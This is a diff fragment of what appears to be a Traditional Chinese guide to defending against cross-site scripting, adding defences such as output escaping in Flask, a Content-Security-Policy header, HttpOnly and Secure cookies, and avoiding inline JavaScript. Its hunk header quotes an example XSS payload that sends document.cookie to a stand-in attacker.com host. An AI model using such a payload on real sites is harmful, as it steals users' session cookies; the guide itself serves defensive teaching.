@@ -439,6 +439,18 @@ document.location='http://attacker.com/steal.php?cookie='+document.cookie;
   ```python
   from flask import escape
   safe_output = escape(user_input)
-  ```  
-
-
+  ```
+* 使用 CSP（內容安全策略
+  - 限制網頁可以執行的 JavaScript 來源，防止外部惡意腳本執行：
+    ```http
+    Content-Security-Policy: default-src 'self'
+    ```
+* HTTP-only & Secure Cookie  
+  - 設置 Cookie 為 HttpOnly，防止 JavaScript 獲取：  
+    ```http
+    Set-Cookie: sessionid=abc123; HttpOnly; Secure
+    ```
+* 避免內聯 JavaScript（Inline JS）
+  - 禁止 <script> 標籤內部寫 JavaScript，改為使用外部文件。  
+* 使用 Web 安全框架
+  -  使用 Django、Flask、Express.js 這類具備 XSS 防護的框架，減少手動防禦的錯誤機會。  
